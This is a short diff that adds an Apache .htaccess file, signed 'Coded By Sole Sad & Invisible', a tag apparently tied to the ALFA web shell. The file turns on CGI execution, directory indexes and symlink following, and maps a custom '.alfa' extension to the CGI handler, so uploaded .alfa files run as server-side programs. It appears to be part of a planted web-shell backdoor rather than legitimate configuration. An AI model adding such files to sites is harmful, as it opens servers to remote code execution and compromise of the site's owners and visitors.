@@ -1,0 +1,4 @@
+#Coded By Sole Sad & Invisible
+Options FollowSymLinks MultiViews Indexes ExecCGI
+AddType application/x-httpd-cgi .alfa
+AddHandler cgi-script .alfa
